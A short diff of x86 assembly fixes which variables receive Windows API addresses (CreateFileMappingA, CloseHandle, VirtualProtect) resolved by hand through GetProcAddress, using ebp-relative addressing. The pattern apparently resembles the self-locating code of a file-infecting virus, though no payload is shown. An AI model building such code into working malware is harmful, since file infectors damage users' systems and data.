@@ -373,21 +373,21 @@ find_APIAddress:
 	push eax
 	push dword ptr [ebp+handle]
 	call [ebp+GetProcAddressAddress]
-	mov [ebp+CreateFileAAddress],eax
+	mov [ebp+CreateFileMappingAAddress],eax
 	
 	lea eax,offset CloseHandleStr  
 	add eax,ebp
 	push eax
 	push dword ptr [ebp+handle]
 	call [ebp+GetProcAddressAddress]
-	mov [ebp+CreateFileAAddress],eax
+	mov [ebp+CloseHandleAddress],eax
 	
 	lea eax,offset VirtualProtectStr
 	add eax,ebp
 	push eax
 	push dword ptr [ebp+handle]
 	call [ebp+GetProcAddressAddress]
-	mov [ebp+CreateFileAAddress],eax 
+	mov [ebp+VirtualProtectAddress],eax 
 	
 	lea eax,offset SetCurrentDirectoryStr
 	add eax,ebp
